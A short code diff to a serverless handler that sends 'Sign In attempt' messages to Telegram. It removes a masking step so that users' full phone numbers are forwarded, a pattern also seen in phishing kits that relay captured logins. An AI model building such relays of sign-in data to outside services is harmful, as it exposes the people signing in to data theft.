@@ -16,13 +16,7 @@ export default async function handler(req, res) {
         error: "Telegram not configured"
       });
     }
-
-    const Phone = phone
-      ? String(phone).replace(
-          /^(\+?\d{2})\d+(\d{2})$/,
-          "$11$11$11$11"
-        )
-      :  "provided";
+const safePhone = phone || "Not provided";
 
     const message =
       `🔐 Sign In attempt\n\n` +
